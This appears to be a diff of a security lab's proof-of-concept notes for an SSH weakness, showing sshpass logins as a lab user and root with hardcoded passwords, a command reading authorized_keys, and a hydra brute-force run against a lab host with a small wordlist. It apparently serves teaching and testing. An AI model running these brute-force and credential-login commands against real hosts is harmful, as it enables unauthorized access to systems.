@@ -12,14 +12,15 @@ unauthorized public keys in `authorized_keys` indicate a prior compromise.
 # Show weak password auth works
 sshpass -p 'demo-ssh-pass' ssh -o StrictHostKeyChecking=no lab-user@ssh-host whoami
 
-# Show root login with password
-sshpass -p 'demo-ssh-pass' ssh -o StrictHostKeyChecking=no root@ssh-host whoami
+# Show root login with password (root password is the platform student password)
+sshpass -p '<student_password>' ssh -o StrictHostKeyChecking=no root@ssh-host whoami
 
 # Show unauthorized keys
-ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i /lab/keys/lab_key lab-user@ssh-host cat ~/.ssh/authorized_keys
+ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i /lab/keys/lab_key lab-user@ssh-host 'cat ~/.ssh/authorized_keys'
 
 # Brute-force demonstration
-hydra -l lab-user -P /usr/share/wordlists/rockyou.txt ssh://ssh-host -t 4 -f
+printf 'password\ndemo-ssh-pass\n123456\nadmin\n' > /tmp/brute-wordlist.txt
+hydra -l lab-user -P /tmp/brute-wordlist.txt ssh://ssh-host -t 4 -f
 ```
 
 ## POC Fix
